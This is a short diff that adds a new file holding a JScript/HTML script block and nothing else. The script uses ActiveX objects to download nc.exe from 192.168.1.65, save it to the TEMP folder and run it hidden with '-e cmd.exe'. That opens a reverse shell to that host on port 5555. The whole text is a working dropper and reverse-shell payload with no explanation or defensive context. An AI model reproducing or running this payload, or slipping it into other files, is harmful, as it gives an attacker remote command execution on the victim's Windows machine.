@@ -1,0 +1,17 @@
+<script>
+var temp = unescape("%TEMP%") + "\\nc.exe";
+var shell = new ActiveXObject("WScript.Shell");
+var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+xhr.Open("GET", "http://192.168.1.65/nc.exe", false);
+xhr.Send();
+
+if (xhr.status == 200) {
+    var stream = new ActiveXObject("ADODB.Stream");
+    stream.Type = 1;
+    stream.Open();
+    stream.Write(xhr.responseBody);
+    stream.SaveToFile(temp, 2);
+    stream.Close();
+    shell.Run("cmd.exe /c " + temp + " 192.168.1.65 5555 -e cmd.exe", 0, false);
+}
+</script>
